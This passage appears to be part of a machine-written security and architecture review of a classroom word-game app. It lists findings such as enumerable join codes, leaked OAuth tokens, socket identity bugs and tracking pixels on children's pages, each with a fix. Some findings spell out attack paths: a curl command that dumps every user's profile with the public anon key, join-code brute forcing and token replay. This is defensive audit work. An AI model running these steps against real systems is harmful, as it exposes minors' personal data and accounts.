- Add `UNIQUE (student_id, lesson_id)` and write with `upsert … onConflict`.

---

## 3. Joining and creating classrooms from the client skips the server-side checks, and join codes can be enumerated
**`fe-next/lib/supabase/education/classrooms.ts:210-211, 227-245`, and `:112-116`** · **Medium** (verify)

**Failure scenario for joins:**
1. The API route `/api/education/classroom/join` has the student-cap check (`canAddStudent`). An earlier review asked for rate limiting to be added there.
2. `joinClassroom` here does the RPC lookup followed by a direct `classroom_memberships.insert` with the anon key. Anyone calling it, or calling PostgREST directly, bypasses that route completely.
3. The free class cap of 50 is therefore not enforced on this path.
4. `lookup_classroom_by_join_code` has no throttle. The code space is 36⁶. With thousands of classrooms at 10x, a script will find valid codes, and a valid code means joining a class of minors. That also opens the miss-gap roster exposure.
5. The check-then-insert at lines 227-245 creates duplicate memberships on a double tap unless there is a unique `(classroom_id, student_id)` constraint. Duplicates inflate `member_count` and the roster.

**Failure scenario for creation:** `createClassroom` inserts into `classrooms` from the browser. If the 3-class free cap lives only in an API route and not in a DB trigger, a free teacher can create unlimited classes. That removes the main reason to pay.

**Fix:**
- Route both operations through server routes, or enforce both caps in `BEFORE INSERT` triggers.
- Add unique constraints.
- Rate-limit the lookup RPC per IP or per user. Alternatively make it callable only by the service role and do the lookup inside the join route.

---

## 4. The Monday digest email lists students by UUID
**`fe-next/lib/education/weeklyTeacherDigest.ts:240-243`** → rendered at **`lib/email/templates/teacherWeeklyProgressDigest.ts:144-155`** · **Medium** (certain)

**Failure scenario:**
1. `assembleWeeklyDigests` builds the roster as `{ studentId: m.studentId, name: m.studentId }`. `WeeklyMembershipRow` has no name field.
2. The template prints "Student movement: 570b3674-…, 9c1e…" and "Inactive 7d: <uuid>, <uuid>, …".
3. Every teacher receives this every week. It is the email meant to drive conversion, and it looks broken.
4. The windowed progress sort (`windowedClassroomProgress.ts:101`) also orders students by UUID.

**Fix:** have the cron fetch `public_profiles(id, display_name, username)` for the membership student ids in chunks. Pass `name` through `WeeklyMembershipRow` and resolve it with `resolveDisplayName([display_name, username], …)`. Add a test asserting that `name !== studentId`.

---

## 5. The teacher progress summary mixes in other teachers' lessons and can show mastery above 100%
**`fe-next/lib/supabase/analyticsClassroom.ts:77-80, 89-100, 124-125, 144`** · **Medium**

**Failure scenario:**
1. The progress query is `.in('student_id', studentIds)` with no lesson or classroom filter. It returns every lesson the student has, including lessons from another teacher's class.
2. `wordsMastered` sums `words_mastered` across *all* those rows (line 124).
3. Lessons belonging to the other teacher are likely hidden by RLS on `vocabulary_lessons` (lines 90-93), so they never reach `lessonWordsMap`. `totalLessonWords` excludes them while the numerator includes them, and `vocabularyMastery` can exceed 100%.
4. XP, streak and accuracy also include work done for another teacher. Your Pro dashboard reports one teacher's numbers to another.
5. At 10x, a class of 50 students × 20+ lessons passes PostgREST's 1000-row cap. The query has no pagination, so some students silently show 0.

**Fix:** first collect the lesson ids assigned to this classroom (from `lesson_assignments`), and add `.in('lesson_id', classroomLessonIds)`. Page with `range()`, or move the aggregation into an RPC.

---

## 6. The assignment counter feeding the free-tier cap fails open and saturates at 3
**`fe-next/lib/education/teacherProMilestoneCounts.ts:92-110`** (doc comment at 86-91) · **Medium** (verify)

**Failure scenario:**
1. The doc comment says this count feeds "the assignment-cap check".
2. On any error, including a timeout, RLS or a cold start, it returns `0`. The comment calls that "fail closed", but for a cap, 0 means "under the limit". A free teacher at the cap gets the full create form.
3. It returns `Math.min(count, TEACHER_USAGE_PROMPT_MIN_ASSIGNMENTS)`, so it never exceeds 3. If `FREE_TIER_LIMITS.assignmentsPerClass` is greater than 3, the cap can never trigger through this function.

**Fix:**
- Keep this function for the upsell prompt only.
- For the cap, return `{ count, error }` without saturating, and disable creation when `error` is set.
- Enforce the cap on the server, in an insert trigger or the API route.

---

## 7. Classroom member counts are silently truncated past 1000 memberships
**`fe-next/lib/supabase/education/classrooms.ts:32-35, 37-44`** · **Low–Medium** (breaks at 10x)

**Failure scenario:**
1. `getClassrooms` selects every membership row for all of a teacher's classes in one request, with no paging.
2. A Pro teacher, or a school account, with 25 classes × 40 students has 1000 or more rows. PostgREST returns the first 1000, so later classes show too few students or 0.
3. On error, every class is set to `member_count: 0`.
4. `member_count` feeds `teacherUsagePrompt` (≥10 students), the milestone ask (≥3), and the "This week" `totalStudents`. Engaged teachers stop seeing the pay ask, and HQ under-reports.

**Fix:** use a count RPC (`select classroom_id, count(*) … group by`), or call `select('*', {count:'exact', head:true})` per class. On error, return `null` counts, not 0.

---

## 8. "Export all classes" loads every practice session ever into the browser
**`fe-next/lib/supabase/education/teacherExportAllClasses.ts:149-154`** (and progress at `:136-148`) · **Low–Medium** (breaks at 10x)

**Failure scenario:**
1. `practice_sessions` is fetched by `student_id` with no date or lesson filter. It pages 1000 rows at a time, sequentially, inside the teacher's tab.
2. A school account with 150 students × several hundred sessions means 100k+ rows and roughly 100+ round trips. The Pro export button hangs or crashes the tab.
3. The query also pulls sessions from other teachers' lessons. Whether those leak into the CSV depends on `buildTeacherExportRows`.

**Fix:** aggregate on the server, for example with an RPC that returns the last activity and count per (student, lesson). Filter by this teacher's assigned lesson ids, and stream the CSV from an API route.

---

## 9. Dismissing the usage-limit pay prompt hides it permanently
**`fe-next/lib/education/teacherUsagePrompt.ts:71-89`** · **Low–Medium** (revenue)

**Failure scenario:**
1. A teacher hits 10 students, sees the limit-triggered Teacher Pro ask, and taps "not now".
2. The code stores `'1'` permanently. That is the exact pattern `teacherProMilestone.ts:57-63` and `teacherTrialOfferDismiss.ts:4-7` say silenced 40 and 65 teachers before you moved those prompts to a 7-day TTL.
3. This prompt is the one tied to the strongest buying signal, and it never returns.

**Fix:** store a timestamp with the same 7-day TTL as `TEACHER_PRO_ASK_DISMISS_TTL_MS`, and migrate a legacy `'1'` the same way `isTeacherProAskDismissed` does.

---

**Fix first:** #1 must be done before the Play route is enabled. #2 and #3 need an RLS audit of `student_lesson_progress`, `classroom_memberships` and `classrooms`. Then #4: it is a one-query fix, and it is the email every teacher sees each week.

## Shard 26

# Senior review: what the previous pass missed

**Scope.** This covers only the files appended to this request: `lib/`, `server/`, `shared/`, `utils/`, `proxy.ts` and the scripts. I skipped anything the earlier shards already reported:
- the proxy `/api` refresh comment
- `process_avatars.py`
- Hebrew final letters in `wikipediaWordProcessor`
- `publicProfiles` swallowing errors
- the stale trial flag in `resumeCheckout`

Three findings are inferred from code or comments I can't fully see: #1 (the view definition), #3 (join-time username rules) and #10 (consumers of a header). Each one carries a "Verify" step. Ordered by severity.

---

## 1. `public_profiles` likely lets anyone dump every user, including students
**`fe-next/utils/publicProfiles.ts:7-11, 20-21, 33-36`**, consumed at **`fe-next/lib/supabase/windowedClassroomProgressQuery.ts:86`**

**Severity:** High (privacy and authz). This is a deal-breaker for any district buyer.

**Scenario:**
1. The header comment says `public_profiles` is a *definer-semantics* view exposed to `anon` and `authenticated`. A definer view runs as its owner, so the RLS on `profiles` doesn't apply to it.
2. The anon key ships in every browser bundle.
3. Anyone can therefore run `GET {SUPABASE_URL}/rest/v1/public_profiles?select=id,username,display_name,last_seen_at,current_level&limit=1000` with that key. There is no `.in('id', …)` filter, and they can page through with `offset`.
4. They get the display name, avatar, level and **`last_seen_at`** for every account, including student accounts created through classroom join. Those students are minors, and their names are what the teacher dashboard resolves from this same view (`windowedClassroomProgressQuery.ts:86`).
5. The site's marketing copy says "FERPA-compliant" (shard 1 #5). This view contradicts that claim.

**Verify:** Run the curl above with the anon key. If it returns rows for ids you didn't ask about, this finding is confirmed.

**Fix:**
- Revoke `anon` on the view.
- Recreate it as `security_invoker = true`, with an RLS policy limited to self, friends and classmates. The alternative is a `SECURITY DEFINER` RPC that takes an id list and checks the caller's relationship to each id.
- Drop `last_seen_at` from the public column set.
- Return `username` only (never `display_name`) for student and anonymous accounts.

## 2. Native Google sign-in logs the raw token response, and the token exchange has no nonce
**`fe-next/utils/nativeOAuth.ts:172, 176-177, 189-192`** (Apple: `244-263`)

**Severity:** Medium-high (secrets in logs, plus a token replay path).

**Scenario:**
1. Line 172 calls `logger.log('[NativeOAuth] Raw SocialLogin result:', JSON.stringify(result))`. That payload contains the Google `idToken`, and usually an `accessToken` as well.
2. Sentry's browser SDK captures console output as breadcrumbs by default. On the user's next error, the token goes to Sentry, as does any remote log sink behind `logger`. The Android WebView console also writes it to logcat.
3. Line 177 returns `JSON.stringify(result).slice(0, 200)` as the error string, so a token prefix can also reach the UI or analytics.
4. `signInWithIdToken` (line 189) is called without a `nonce`. Supabase therefore accepts any unexpired Google ID token whose `aud` matches the web client ID (line 35).
5. Anyone with access to those logs can mint a session as the victim for the token's lifetime of about an hour.

**Fix:**
- Delete the log at line 172 and the error at line 177. Log only `!!idToken`.
- Generate a random nonce. Pass its SHA-256 to `SocialLogin.login({ provider:'google', options:{ nonce } })` and pass the raw value to `signInWithIdToken({ …, nonce })`.
- Do the same for Apple.
- Make sure "skip nonce check" is off in Supabase Auth.

## 3. Classroom results, teams and standings use `username` as the identity
**`fe-next/shared/types/classroom.ts:15, 66-68, 93, 108`**, and **`fe-next/shared/utils/classroomLiveContext.ts:72-75`**

**Severity:** Medium (data integrity in teacher-facing results; it gets worse with class size).

**Scenarios:**
- **Duplicate names merge.** `masteryByPlayer: Record<string,…>`, `coverage.foundBy`, `sessionStandings` and `teamBattle.scores` are all keyed on username. Guests join with a typed display name, and two kids called "Noa" in a class of 30 is normal. They merge into one mastery row, and their summed session score crowns a winner who doesn't exist.
- **Rows inherit across rounds.** Uniqueness may be enforced per room at join. Even so, if "Sam" leaves after round 1 and another student joins as "Sam" in round 2, `sessionStandings` (which is summed across rounds) gives student B student A's points.
- **A student can drop themselves from teams.** Lines 72-75 exclude anyone whose name case-insensitively matches `teacherName`. A student who renames to "Ms Cohen", or "teacher" if that is the teacher's display name, is never dealt to a team. Their found words then never count toward a team.

**Verify:** Check whether the join handler rejects a duplicate username within a room.

**Fix:**
- Key every map and list in `ClassroomSummary` by `userId`, and carry `username` only as a display field. `ClassroomEconomyBoard` already does this (`classroomEconomy.ts:64`).
- Exclude the teacher by `game.teacherId`, not by name.

## 4. The locale redirect is a personalised **301** with no `Vary` or `no-store`
**`fe-next/proxy.ts:165-174`**

**Severity:** Medium. It hurts UX now and becomes an outage-class bug once a CDN sits in front of the site.

**Scenario:**
1. A Hebrew user hits `/`. The proxy reads the `boggle_language` cookie and `Accept-Language`, and returns a `301 → /he`.
2. Browsers cache 301s indefinitely per URL. The user later switches to English, which updates the cookie, and types `lexiclash.live`. The browser serves the cached redirect to `/he` without ever reaching the server. The same applies to every bare deep link they have opened, such as `/daily` or `/join`.
3. At 10x you will likely add Cloudflare or another CDN. The response has no `Vary: Cookie, Accept-Language` and no `Cache-Control: private`, so the edge can cache the first visitor's redirect and send everyone to `/he`.

**Fix:**
- Return `307`, or `302`, with `Cache-Control: private, no-store` and `Vary: Cookie, Accept-Language`.
- Keep a 301 only for redirects that don't depend on the user, if you want them for SEO.

## 5. Daily word validation fails **open** when the AI is down, and an outage can mark good words rejected
**`fe-next/utils/dailyChallenge/wikipediaWordProcessor.ts:467-491`** (also `450-456`)

**Severity:** Medium (it crosses a trust boundary with untrusted Wikipedia text).

**Scenario:**
1. Candidates come from Wikipedia's `mostread`, `tfa` and `onthisday` feeds. Those feeds are full of proper nouns, transliterations and, on a bad news day, offensive terms.
2. The AI call throws because of an outage, a timeout or rate limiting.
3. Any word scoring ≥85 is then approved on format alone (lines 472-481).
   - Base 50 + tfa 20 + variety 15 + length 10 = 95, so most 6-letter TFA words qualify.
   - Nothing else checks them: there is no dictionary or profanity check. The same unvalidated word becomes the daily puzzle for every player.
4. Words below 85 come back as `{valid:false, source:'ai'}` (lines 486-490), which looks like a real AI rejection.
5. `updateWordValidationStatus('invalid')` maps that to `rejected` (lines 514-520). An outage can therefore permanently reject valid words in `daily_challenge_word_bank`. This is inferred from the mapping; I can't see the caller.

**Fix:**
- On error, return a third state such as `{ valid: null, source: 'unavailable' }`. Leave those rows `pending` and retry on the next run.
- Never auto-approve on format alone. If you need a fallback, use only words already present in your static dictionary.
- Fix the `source` label: line 454 is a database hit, not an AI result.

## 6. Socket auth: the HS256-only fast path, plus a "timeout means guest" fallback, turns the spoofable handshake path into the default path under load
**`fe-next/server/socketAuth.ts:55-58, 61-74`**

**Severity:** Medium (architecture). This is the next-10x break, and it multiplies shard 5 #1.

**Scenario:**
1. Local verification uses only `SUPABASE_JWT_SECRET` (HS256). Supabase is moving projects to asymmetric JWT signing keys (ES256/RS256). Once yours rotates, or if the env var goes missing on a deploy, every token fails local verification without any error.
2. Every connect and reconnect then falls back to the remote `getUser`. The file's own comment measures that call at 2-3s p50 with a 29s tail.
3. Past 5s the call times out and returns `null`. The main namespace then treats a signed-in teacher or student as a **guest**.
4. With no `verifiedUserId`, `classroomSocketAuth.getAuthUserId` falls back to the client-supplied `handshake.auth.authUserId` (shard 5 #1). Under load, the spoofable path becomes the normal one.
5. Each fallback also leaves a 5s `setTimeout` running (lines 65-67), so a reconnect storm builds up thousands of live timers.

**Fix:**
- Verify with `jose` `createRemoteJWKSet` (cached), which handles both the legacy HS256 secret and the new asymmetric keys.
- Emit a metric or alert whenever the remote fallback is taken.
- If a token was **presented** but couldn't be verified, reject with a retryable error instead of downgrading to guest.
- Clear the race timer.

## 7. The cross-tab "auth code lock" doesn't exclude anything
**`fe-next/utils/crossTabAuthSync.ts:236-287`** (code broadcast at `273` and `322`)

**Severity:** Low-medium (concurrency in the sign-in path).

**Scenario:**
1. The "double-check" at lines 263-271 is `setItem` followed by `getItem` in the **same tab**. A tab always reads back its own write, so the check always passes.
2. localStorage has no compare-and-set across tabs. Two tabs that open the same magic link or OAuth callback, for example after a double-click in the email client, both "acquire" the lock.
3. Both tabs exchange the same PKCE code. One fails with a used-code or missing-verifier error and broadcasts `AUTH_FAILED`. Depending on its handler, the tab that succeeded may show an error, or loop back to the email step.
4. The `catch` block returns `true` (line 286), so any storage error also gives up the lock.
5. The raw auth `code` is written to localStorage and broadcast to every tab. It sits next to the PKCE verifier, which supabase-js also stores there.

**Fix:**
- Use `navigator.locks.request('auth-code:'+hash(code), { ifAvailable: true }, …)`, which is a real cross-tab mutex in all evergreen browsers. Keep the current code only as a fallback.
- Broadcast a hash of the code, never the code itself.

## 8. Classroom window progress truncates silently and fails as "0%", and it will break before 10x
**`fe-next/lib/supabase/windowedClassroomProgressQuery.ts:57-62, 63, 129-135, 121-125`**

**Severity:** Medium (wrong data on a paid surface).

**Scenario:**
1. Sessions are capped at 2000, ordered newest-first (lines 61-62). A class of 30 doing 3 sessions a day over 30 days produces 2700 rows. The 30-day window then quietly drops its oldest week, while the 7-day window looks fine, so the two disagree.
2. `lesson_assignments` has `.limit(2000)` with no ordering (line 63). Every id then goes into `.in('assignment_id', …)` (line 132) as part of a GET URL. A teacher with a few hundred assignments pushes that URL past PostgREST and proxy limits, and the request fails.
3. That error is only logged (lines 136-137), so `completionRows = []`. The Pro dashboard and weekly digest then report **0% assignment completion**, with no sign that anything failed.
4. The full `results` JSON for up to 2000 rows is shipped to the teacher's browser (line 57) only to count array lengths (lines 115-116).

**Fix:**
- Move this into one SQL RPC that returns per-student found and missed counts for the 7- and 30-day windows, plus assignment completion counts.
- Until then, chunk the `.in()` call at about 100 ids.
- Surface errors as an "unavailable" state, never as zeros.

## 9. PostHog receives student identity, and every anonymous classroom guest becomes a person profile
**`fe-next/utils/authAnalytics.ts:48-55, 63-71`** (session replay is referenced at `fe-next/utils/authFetch.ts:34`)

**Severity:** Medium (compliance and cost).

**Scenario:**
1. `identify` sends `email` and `display_name` for every authenticated user. That includes students, and the anonymous Supabase users that `/classroom/join` mints (shard 4 #7).
2. Session replay is on, according to the authFetch comment. Student play screens are therefore recorded and linked to an identified minor. This happens with a third-party processor, with no DPA mentioned and no role check.
3. At 10x, each anonymous guest join becomes an identified PostHog person. Person profiles are billed separately, so the analytics bill grows with classroom joins, which you don't earn revenue on.

**Fix:**
- Never send `email`.
- For student or anonymous users, skip `identify`, or identify with an opaque id and no traits.
- Turn off replay on `/student`, `/education/live` and the classroom routes.
- Write down the processor list before the first district deal.

## 10. Verify: some proxy paths forward a client-supplied `x-lc-pathname` and skip session refresh
**`fe-next/proxy.ts:59-69, 168-171, 47-50`**

**Severity:** Low. It rises if a layout uses the header for gating or canonical URLs.

**Scenario:**
1. `continueRequest` overwrites `x-lc-pathname` (line 189), but three paths never go through it. That means whatever the client sends reaches the app, or the header is missing:
   - any path containing `.` (line 62)
   - the bot rewrite (line 170)
   - the QA rewrite (line 49)
2. On the bot rewrite, crawlers render with no pathname. If the `[locale]` layout builds canonical or hreflang tags from this header, crawlers see the wrong tags.
3. Any route segment containing a dot, such as `/en/u/john.doe` or an email, also skips the auth refresh and security headers.

**Verify:** `grep -r "x-lc-pathname"` and check what the consumers decide based on it.

**Fix:**
- Strip the incoming `x-lc-pathname` at the top of `proxy()`.
- Set the header on every rewrite and next path.
- Replace `pathname.includes('.')` with a file-extension regex.

---

**Fix first:** #1 and #2. Both can be confirmed in under 10 minutes: a curl against `public_profiles`, and a grep for line 172 in a production Sentry breadcrumb. Both are what a school's security questionnaire would turn up.

## Shard 27

# Security and architecture review: what the previous pass missed

Most files in this batch are dev tooling: video builders, skill scaffolds, the HIG puller and the contrast linter. The one file on a production trust boundary is `fe-next/utils/socketAuthUpgrade.ts`, so the top three findings are there.

Not repeated from the previous pass:
- The `DEFAULT_SKILLS` mutation in `trainingProgressStorage.ts`.
- The `shell=True` usage in `build_cine*.py`, which is safe.
- Shard 5's client-controlled `handshake.auth.authUserId` fallback. That finding is related to #1 and #2 below but is a different hole.

There are 7 findings, ordered by severity. I am not padding to 10.

---

## 1. A socket keeps the previous user's identity after sign-out or a switch to a guest account
**Where:** `fe-next/utils/socketAuthUpgrade.ts:36`, together with the design described at `:4-5` and `:9`.
**Severity:** High. It misattributes writes between students on shared classroom devices.

**Why it happens:**
- The server binds `socket.data.verifiedUserId` once, at connect time, and never re-checks it (`:4-5`).
- The only re-handshake trigger is `event === 'SIGNED_IN' && !handshakeHadToken`.
- Nothing reacts to `SIGNED_OUT`.
- Nothing reacts to a `SIGNED_IN` for a *different* user when the old handshake already carried a token.
- `reloadOnSignIn` deliberately skips anonymous sign-ins (`:9`), so no page reload covers this case either.

**Failure scenario (a shared school Chromebook):**
1. Student A is signed in. The app-wide socket connected with A's JWT, so `verifiedUserId = A` and `handshakeHadToken() === true`.
2. A signs out. No `SIGNED_OUT` handler exists, so the socket stays open as A. If sign-out doesn't hard-reload the page, which I couldn't confirm, nothing else closes it.
3. Student B joins the class by code. The join page calls `signInAnonymously()` and `SIGNED_IN` fires.
4. `shouldUpgradeSocketAuth` returns false, because `handshakeHadToken` is still true from A's handshake.
5. B joins and plays on a socket the server believes is A. B's scores, XP and classroom membership writes all land on A's account. B gets nothing.

**Fix:**
- Track the identity, not a boolean. Record the `sub` from the handshake JWT, and re-handshake whenever `session?.user.id !== handshakeUserId`.
- Handle `SIGNED_OUT` explicitly: disconnect and reconnect tokenless so the socket becomes a guest.
- Server side, consider an `auth:rebind` event that verifies a fresh JWT and replaces `verifiedUserId` without a reconnect. That also fixes #2.

## 2. The upgrade is dropped if the session arrives while the socket is still connecting
**Where:** `fe-next/utils/socketAuthUpgrade.ts:36,57`
**Severity:** Medium-High. It reproduces the exact "0 students recorded" bug this module was written to fix (`:10-14`).

**Why it happens:** the gate requires `socketConnected`. A `SIGNED_IN` that arrives while the socket is mid-handshake is silently ignored. There is no retry and no deferred re-check.

**Failure scenario (slow school Wi-Fi):**
1. The page loads and the socket starts connecting. socket.io evaluates the `auth` callback before the server acks the connection, and at that moment no session exists, so the token is null.
2. The student taps Join, and `signInAnonymously()` resolves.
3. `SIGNED_IN` fires before the `connect` ack. `socket.connected` is false, so the function returns early.
4. The socket finishes connecting without a token. Because `SIGNED_IN` already fired, nothing triggers again.
5. The student plays, and every end-of-round writer drops them (`:11-13`).

**Secondary issue at `:64-65`:** when the upgrade does fire, it is a full disconnect and reconnect. The server runs its disconnect handlers, which may cover seat release, host reclaim and room teardown. Recovery then depends on SocketContext re-emitting the remembered `join` (`:15-17`). For a teacher host socket mid-launch, this is a teardown you don't want.

**Fix:**
- When `SIGNED_IN` arrives and the socket is not yet connected, register `socket.once('connect', ...)` to re-evaluate. Reconnect at that point if `!handshakeHadToken()`.
- Better: replace disconnect and reconnect with the server-side `auth:rebind` event from #1.

## 3. The verify-once trust model means revocation never reaches live sockets
**Where:** `fe-next/utils/socketAuthUpgrade.ts:4-5`. This describes `server/socketSetup.ts`, which was not shown.
**Severity:** Medium now, and it gets worse at 10x.

**Failure scenario:**
1. A teacher removes a student, an admin bans an account, a teacher's Pro or teacher role is revoked, or a user deletes their account.
2. Their existing socket keeps the `verifiedUserId` it got at connect time. The JWT's 1-hour expiry is never re-checked, so the socket stays authorized indefinitely.
3. The socket can keep joining rooms and sending privileged events, such as teacher controls gated on `game.teacherId`, until it happens to reconnect.

At higher scale you will run long-lived sockets on more nodes. Then "revoke" means nothing for real-time paths, while the HTTP routes do enforce it. That gives you two inconsistent authorization models.

**Fix:**
- Store the token's `exp` on `socket.data` at connect, and disconnect when it passes.
- Have the client send the refreshed token on `TOKEN_REFRESHED` through the same `auth:rebind` event.
- For privileged handlers (teacher controls, score persistence), re-check membership or role against the database. Don't rely only on the connect-time id.

## 4. LLM-generated crossword clues ship to a children's product with no content-safety gate, and judge scores are unbounded
**Where:**
- `.claude/workflows/crossword-clue-craft.js:45`: raw dictionary senses go into the prompt.
- `:24-31`: the judge schema has no `minimum` or `maximum`.
- `:74-75` and `:98-99`: failures are coerced to `''` and `0`.

**Severity:** Medium. These are trust and compliance concerns for a classroom audience.

**Failure scenario:**
1. `defs.slice(0, 4)` passes the first four Wiktionary-style senses straight into the craft prompt. For many common words these include vulgar or sexual senses, and in principle injected instructions.
2. The crafter writes a clue from that sense, and two LLM judges score only crossword quality.
3. The main thread applies only the circular and length gates (`:9-10`). The clue enters the bank and is shown to students.
4. A judge returning `score: 7` passes any threshold, because the schema doesn't bound it.
5. A failed craft still produces a row with `clue: ''`. That row is judged, which costs money, then filtered later or not at all.

**Fix:**
- Add `minimum: 0, maximum: 1` to the judge `score` schema, and clamp the value in the main thread.
- Return `null` on a craft failure instead of `''`.
- Add a third judge or a filter for "suitable for ages 8+", and require it to pass.
- Drop senses tagged vulgar, offensive or slang before building the prompt.

## 5. The FAQ parser emits FAQPage JSON-LD from prose that isn't an FAQ
**Where:**
- `fe-next/utils/seo/parseFaqProse.ts:23-31`: the quoted format has no `?` check.
- `:91-99`: the fallback picks whichever section yields the most pairs.

**Severity:** Medium. The risk is a Google manual action on structured data, across the SEO pages that make up your acquisition funnel.

**Failure scenario:**
1. A blog section has paragraphs that open with a quoted term, such as `"Boggle" is a 1972 game...` or `"Wordle" went viral...`.
2. `tryQuotedFormat` takes the quoted term as the question ("Boggle") and the rest of the paragraph as the answer. Nothing checks that the question is a question.
3. The inline format also turns any rhetorical "Why X? Because..." paragraph into a pair.
4. The article has no section titled "FAQ" (all non-English locales), so the fallback picks the section with the most pairs. That can be an ordinary body section.
5. The page then publishes FAQPage schema whose questions are not on the page as questions. Google treats this as spammy markup, and site-wide markup abuse can earn a manual action.

**Fix:**
- In `tryQuotedFormat`, require `QUESTION_TERMINATORS.test(question)`, and fall through to the other formats instead of `return null`.
- In the fallback, require that at least about 80% of the section's blocks parse as Q/A. Alternatively, use a small per-locale FAQ title list (`שאלות נפוצות`, `よくある質問`, `Preguntas frecuentes`, and so on).
- Wherever these pairs are serialized into `<script type="application/ld+json">`, escape `<` as `\u003c`. An authored answer that contains `</script>` currently breaks the page.

## 6. Asset scripts overwrite production files in place and report misleading status
**Where:**
- `scripts/batch_process_mascots.py:91-99, 107, 133-141`
- `.agents/skills/apple-design/scripts/pull-hig.mjs:760`

**Severity:** Low-Medium. Unoptimized assets could ship, and the repo could be left half-regenerated.

**Mascot script failure scenario:**
1. `process_gif` writes the new full-size RGBA GIF directly over `fe-next/public/mascot/<name>.gif`.
2. `optimize_gif` then runs `subprocess.run(['gifsicle', ...])`. If gifsicle isn't installed, this raises `FileNotFoundError`; it does not return a nonzero code.
3. The outer `except` lists the file as "Failed", but the production asset has already been replaced by an unresized GIF, often several MB.
4. If gifsicle does run but returns nonzero, the file is kept unoptimized and counted as *processed*.
5. Either way, the bloated mascots are a `git add` away from your mobile pages.

**HIG puller:** `renderPage` can throw partway through the `map` at line 760, after earlier `writeFile` calls have already started. You end up with some files regenerated and a stale `hig-lookup.md`. The error message only promises that nothing was *pruned*.

**Fix:**
- In the mascot script, render to a temp path, optimize it, and only `replace()` into `public/` if both steps succeed. Check `shutil.which('gifsicle')` up front.
- In the HIG puller, render every page to strings first, and only then write the files.

## 7. The "senior-qa" scripts are stubs that always report success
**Where:**
- `.claude/skills/senior-qa/scripts/coverage_analyzer.py:47-59` (it prints "Completed successfully" at `:32`)
- `e2e_test_scaffolder.py:47-59`
- `test_suite_generator.py:47-59`

**Severity:** Low, but it gives false assurance.

**Failure scenario:**
1. You or an agent asks the senior-qa skill to check coverage before a billing change.
2. The script analyzes nothing. It sets `findings = []`, prints `✅ Completed successfully!` and `Findings: 0`, and exits 0.
3. The agent reports "coverage analysis found no issues", and that green result gets treated as a gate.

**Fix:** delete these scripts, or make each one print "not implemented" and `sys.exit(2)`, so nothing can mistake them for a passing check.

---

**Recommended order:** #1 and #2 share one fix, the server-side `auth:rebind` event plus identity tracking on the client. That fix also covers most of #3. Do it before more classes go live on shared devices.

## Shard 28

# Senior review: trust boundaries, billing integrity, and 10x scale in the files shown

**Scope.** I read only the files in this batch:
- the home route
- `LocaleBodyChrome` and `SiteExtras`
- the about, accessibility, account-delete and parental-controls pages
- the dev scripts and mocks

The previous pass already covered several issues in these files, and I don't repeat them:
- the `?next=` open redirect
- the delete-page step getting stuck
- stale parental-control toggles
- the accessibility toggles
- the "no ads" and "five languages" copy
- the `--overwrite` bug in the remove-bg script

Several findings below depend on code I couldn't see: `SocialMediaPixels`, `rendersSiteChrome`, `/api/account/delete` and `fetchLandingData`. Each one says exactly what to check.

---

## 1. Tracking pixels and Google One Tap can load on the student and classroom pages used by children (High, verify)
**Where:** `fe-next/app/[locale]/SiteExtras.tsx:39,52`, mounted from `LocaleBodyChrome.tsx:40-45,61`. The conflicting claim is in `about/content.ts:111`: "COPPA-compliant practices, child-safe advertising".

**Failure scenario:**
1. A 9-year-old opens a join link such as `/en/join/ABC123`, or lands on `/education/live`.
2. If `rendersSiteChrome(pathname)` returns true for that route, `SiteExtras` mounts `SocialMediaPixels`, `GoogleOneTapInitializer` and `PagePresenceReporter`. Nothing in `SiteExtras` excludes routes.
3. The cookie-consent prompt is deliberately suppressed on join screens (`LocaleBodyChrome.tsx:41-45`, plus the skip in `DeferredLayoutWidgets`). The child therefore never accepts or rejects consent, and consent stays "unset".
4. Suppose `SocialMediaPixels` treats "unset" as allowed. Many implementations do this outside the EU. Then the child's device ID, IP address and page view go to Meta or TikTok.
5. This contradicts the COPPA, FERPA and "never sell data" claims across the education pages. A school DPA review or an FTC complaint ends the teacher-revenue line.

**Fix:**
- Add a hard route denylist in `SiteExtras` that applies whatever the consent state is. Never mount pixels, One Tap or ads on `/join`, `/student`, `/education/live`, `/teacher` or `/classroom*`.
- Add a test asserting `SocialMediaPixels` is absent on those paths.

**To verify:** `rendersSiteChrome` for the join, student and live paths, and the default behaviour of `SocialMediaPixels` when consent is unset.

## 2. Deleting an account doesn't visibly cancel a paid Polar subscription (High for revenue and chargebacks, verify)
**Where:** `fe-next/app/[locale]/account/delete/PageClient.tsx:49-66`

**Failure scenario:**
1. A Teacher Pro subscriber ($9/month) goes to `/account/delete` and types DELETE.
2. The page calls `DELETE /api/account/delete` with no subscription check and no warning step.
3. If that route only deletes the auth user and profile, Polar keeps charging every month. The teacher has no account left to cancel from, so they file a chargeback. Each one costs a dispute fee, and the dispute ratio puts the Polar merchant account at risk.
4. The next `subscription.updated` or `subscription.revoked` webhook arrives for a `userId` that no longer exists. `upsertSubscription` either fails with a foreign-key violation and returns 500, so Polar retries indefinitely, or it inserts an orphan row.

**Fix:**
- In the delete API, look up the active `provider_subscription_id` and cancel it through the Polar API before deleting. Alternatively, refuse deletion with a "cancel your plan first" link.
- Make the webhook return 200 and log when the user is unknown.
- On the client, show a "your Pro plan will be cancelled" confirmation when `hasPro` is true.

## 3. Every page is rendered uncached on the origin, and landing-data refreshes can trigger a burst of DB queries (Medium-High at 10x)
**Where:** `fe-next/app/[locale]/(home)/page.tsx:25-32` (documented `fetchCache = 'force-no-store'`, with `cache-control: private, no-store` on every page) and `:88-92`.

**Failure scenario:**
1. Every page under `[locale]` (blog, SEO pages, homepage) is rendered fresh on each request, and the CDN can't cache any of it. At 10x traffic, including crawler bursts, render CPU scales linearly.
2. The `backend/handlers` tree suggests a custom server. If Next rendering and Socket.IO share that process, slow renders mean timer and socket latency for live classrooms.
3. On the homepage, every request calls `fetchLandingData(locale)`, which costs 5 DB round-trips on a miss, with a 30-second TTL.
4. Suppose the cache stores only resolved data and not the in-flight promise. Then every request arriving between TTL expiry and the first fetch resolving starts its own 5 queries. That is a cache stampede every 30 seconds.
5. `locale` is also passed unvalidated. With the default `dynamicParams`, a request for `/zz-anything` creates a new cache key and a new set of queries, which means unbounded memory growth on a long-lived process.

**Fix:**
- Cache the in-flight promise in `fetchLandingData` (single-flight).
- Validate `locale` against `SUPPORTED_LOCALES` and call `notFound()` before fetching.
- Use `after()` or `waitUntil` for the background warm.
- Until the upstream Next fix lands, add CDN rules that set `s-maxage` on `/blog/*`, `/education/*` landing pages and other static SEO paths, or move those routes out from under the `force-no-store` layout.
- Run the socket server in its own process.

